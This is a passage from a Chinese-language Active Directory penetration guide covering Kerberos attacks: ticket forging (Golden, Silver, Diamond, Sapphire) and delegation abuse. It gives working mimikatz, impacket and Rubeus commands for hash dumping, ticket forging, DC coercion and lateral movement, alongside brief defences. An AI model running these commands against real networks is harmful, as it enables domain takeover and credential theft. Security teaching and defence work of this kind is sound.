## 4. Kerberos 攻击矩阵

Kerberos 是 AD 的核心认证协议，理解其票据流转是 AD 渗透的灵魂。本节覆盖从离线爆破到票据伪造的完整攻击矩阵。

### 4.1 Kerberos 协议流程回顾

```
客户端                        KDC(域控)                    服务服务器
  │                            │                              │
  │── AS-REQ (用户名+预认证)──>│                              │
  │                            │  用用户密码哈希校验预认证      │
  │<── AS-REP (TGT+会话密钥)──│  TGT用krbtgt哈希签名           │
  │  ★ 此时拿到TGT                                            │
  │                            │                              │
  │── TGS-REQ (TGT+要访问的SPN)─>│                            │
  │                            │  用krbtgt哈希验TGT            │
  │<── TGS-REP (TGS票据)──────│  TGS用服务账户哈希加密         │
  │  ★ 此时拿到TGS                                            │
  │                            │                              │
  │── 服务请求 (TGS票据)──────────────────────────────────────>│
  │                            │  用服务账户哈希解TGS验签       │
  │<── 服务响应────────────────────────────────────────────────│
```

**攻击面映射**：
- AS-REQ/AS-REP 阶段 → AS-REP Roasting(关闭预认证)/密码喷洒(预认证爆破)
- TGS-REQ/TGS-REP 阶段 → Kerberoasting(离线爆破TGS)
- TGT 伪造 → Golden Ticket(用krbtgt哈希)/Diamond/Sapphire Ticket
- TGS 伪造 → Silver Ticket(用服务账户哈希)
- 委派流程 → S4U2Self/S4U2Proxy 滥用

### 4.2 Golden Ticket

拿到 **krbtgt 账户哈希**后，可伪造任意用户的 TGT。由于 TGT 仅由 krbtgt 哈希签名验证，DC 不会校验该用户是否真实存在或密码是否正确，因此伪造的 TGT 可访问全域任何服务，且**即使真实用户改密码仍有效**(直到krbtgt密码轮换，通常两次轮换才彻底失效)。

```bash
# 1. 获取krbtgt哈希 (DCSync)
secretsdump.py corp.local/Administrator:Pass@10.0.0.1 | grep krbtgt
# 或 mimikatz: lsadump::dcsync /user:corp\krbtgt

# 2. 铸造Golden Ticket (mimikatz)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /krbtgt:<NTLM哈希> /ptt
# /user 可填任意(甚至不存在的)用户名
# /ptt 立即注入内存(Pass-the-Ticket)，也可导出文件
# 可加 /id:500 /groups:512 强制Domain Admin SID

# 3. impacket ticketer (Linux)
ticketer.py -nthash <krbtgt哈希> -domain-sid S-1-5-21-xxx -domain corp.local Administrator
# 生成ccache票据，设置KRB5CCNAME环境变量使用

# 4. 使用伪造TGT访问服务
export KRB5CCNAME=Administrator.ccache
psexec.py -k corp.local/<EMAIL-REDACTED>    # 无需密码直接横向
smbexec.py -k corp.local/Administrator@fileserver01
```

**Golden Ticket特征**：
- 有效期默认10年(可自定义)，krbtgt哈希不变则长期有效
- 可伪造任意用户身份，包括不存在的账户
- 注入高权限SID即可获得Domain Admin
- **防御**：定期轮换krbtgt密码(需两次，因保留旧哈希)，监控异常TGT(超长有效期/异常SID History)

### 4.3 Silver Ticket

拿到**服务账户哈希**后，直接伪造该服务的 TGS 票据。与 Golden Ticket 不同，Silver Ticket 不经过 KDC，因此不产生 TGS 请求日志，更隐蔽，但仅限访问该特定服务。

```bash
# 1. 获取服务账户哈希 (如CIFS服务的计算机账户哈希)
secretsdump.py corp.local/user:Pass@10.0.0.5   # 拿目标主机本地SAM

# 2. 铸造Silver Ticket (伪造CIFS服务票据，访问文件共享)
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-xxx /target:fileserver01.corp.local /service:cifs \
  /rc4:<服务账户NTLM哈希> /ptt

# 3. 直接访问 (无需与DC交互)
dir \\fileserver01.corp.local\c$
```

**Silver vs Golden 对比**：

| 维度 | Golden Ticket | Silver Ticket |
|------|--------------|---------------|
| 伪造票据 | TGT | TGS |
| 所需哈希 | krbtgt | 服务账户 |
| 影响范围 | 全域所有服务 | 单一服务 |
| 是否经过KDC | 是(请求时) | 否(直接伪造TGS) |
| 隐蔽性 | 中(有TGS日志) | 高(无KDC交互日志) |
| 失效条件 | krbtgt密码轮换两次 | 服务账户密码修改 |

### 4.4 Diamond Ticket (2021)

传统 Golden Ticket 的 TGT 是完全伪造的，特征明显(无真实 PAC、有效期异常)。Diamond Ticket 是**修改真实 TGT**——先合法获取一个普通用户的 TGT，再用 krbtgt 哈希**解密、修改 PAC(注入Domain Admin等高权限组SID)、重新加密**，保留真实票据结构，规避 PAC 验证检测。

```bash
# Rubeus 铸造Diamond Ticket
Rubeus.exe diamond /krbkey:<krbtgt AES密钥> /user:lowprivuser \
  /password:<REDACTED> /domain:corp.local /dc:dc01.corp.local \
  /ticketuser:Administrator /ticketuserid:500 /groups:512

# 原理：合法获取lowprivuser的TGT → 用krbkey解密 → 替换PAC中的用户名/SID/组 → 重加密
# 结果：票据看起来像DC正常签发，但PAC内是Administrator权限
```

> **要点**：Diamond Ticket 解决 Golden Ticket "完全伪造易被PAC校验发现"的问题，是2021年后的隐蔽票据伪造技术。防御：启用PAC签名校验(KB5008383)。

### 4.5 Sapphire Ticket (2022)

Sapphire Ticket 是 Diamond 的进化版——通过 **S4U2Self** 让 DC **合法地**为目标用户(如Administrator)生成 PAC，再结合 krbtgt 哈希重加密，使 PAC 完全由 DC 生成而非攻击者伪造，进一步规避 PAC 异常检测。

```bash
# 原理：利用约束委派的S4U2Self，让DC为Administrator生成合法PAC
# 再用krbtgt密钥把PAC装进攻击者控制的TGT
# PAC是DC"亲笔签发"的，任何PAC校验都无法区分

# 需要一个配置了约束委派到自身或特定服务的账户
Rubeus.exe sapphire /krbkey:<krbgt密钥> /user:deleguser /password:Pass \
  /domain:corp.local /dc:dc01.corp.local /impersonate:Administrator /targetservice:cifs
```

### 4.6 委派攻击

AD 委派允许服务代表用户访问其他服务，是横向移动与提权的重要路径。三类委派：

**非约束委派 (Unconstrained Delegation)**——最危险，服务可代表任何用户访问任何服务：

```powershell
# 1. 查找非约束委派的主机
Get-DomainComputer -Unconstrained
# 或 BloodHound: Find Computers with Unconstrained Delegation

# 2. 若DC配置了非约束委派(罕见但致命)，配合PrinterBug强制DC认证
# SpoolSample触发DC向攻击者主机认证 → 捕获DC的TGT → 横向到任意服务
SpoolSample dc01.corp.local attacker.corp.local   # 触发DC认证
# 同时在attacker主机用Rubeus监听
Rubeus.exe monitor /interval:5 /filteruser:DC01$  # 捕获DC$的TGT
# 拿到DC$的TGT → 用它访问任意服务(DC代表自己认证过)
```

**约束委派 (Constrained Delegation)**——限制只能代表用户访问特定服务：

```bash
# 利用S4U2Self + S4U2Proxy 代表任意用户访问委派允许的服务
# S4U2Self: 服务代表用户向自己请求TGS(获取用户身份)
# S4U2Proxy: 用上一步票据换取目标服务的TGS

# Rubeus 完整委派攻击
Rubeus.exe s4u /user:webservice$ /rc4:<计算机账户哈希> \
  /impersonateuser:Administrator /msdsspn:cifs/fileserver01.corp.local \
  /ptt
# webservice$ 配置了到fileserver01 CIFS的约束委派
# 结果: 获得Administrator访问fileserver01 CIFS的TGS → dir \\fileserver01\c$

# 若目标服务允许委派到任意SPN(配置时用服务类而非完整SPN)，可替换SPN扩展攻击面
```

**基于资源的约束委派 (RBCD, Resource-Based Constrained Delegation)**——2012引入，由**资源方**指定谁可委派到它。若攻击者对某计算机账户有 `WriteAccountRestrictions` 权限，可将自己控制的机器设为该资源的委派方，进而以任意用户身份访问该资源。

```bash
# 1. 查找对目标有WriteAccountRestrictions权限的账户(PowerView)
Find-InterestingDomainAcl | ?{$_.ObjectAceType -eq "WriteAccountRestrictions"}

# 2. 攻击者控制一台机器账户(或新建，需MachineAccountQuota>0，默认10)
# 用powermad新建机器账户
New-MachineAccount -MachineAccount evil$ -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)

# 3. 设置RBCD：让evil$可委派到目标target$
Set-DomainObject -Identity target$ -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=@($SD)}
# 或用rbcd.py
rbcd.py -f evil -t target -action write corp.local/user:Pass

# 4. S4U滥用：以Administrator身份访问target$
Rubeus.exe s4u /user:evil$ /rc4:<evil$哈希> /impersonateuser:Administrator \
  /msdsspn:cifs/target.corp.local /ptt
```

> **要点**：RBCD 是 2019 年后最流行的本地提权之一——普通域用户凭借默认 `MachineAccountQuota` 即可新建机器账户，若对某高权限主机有 `WriteAccountRestrictions` 即可提权到该主机的 SYSTEM。防御：限制 MachineAccountQuota、监控 msDS-AllowedToActOnBehalfOfOtherIdentity 修改。

---

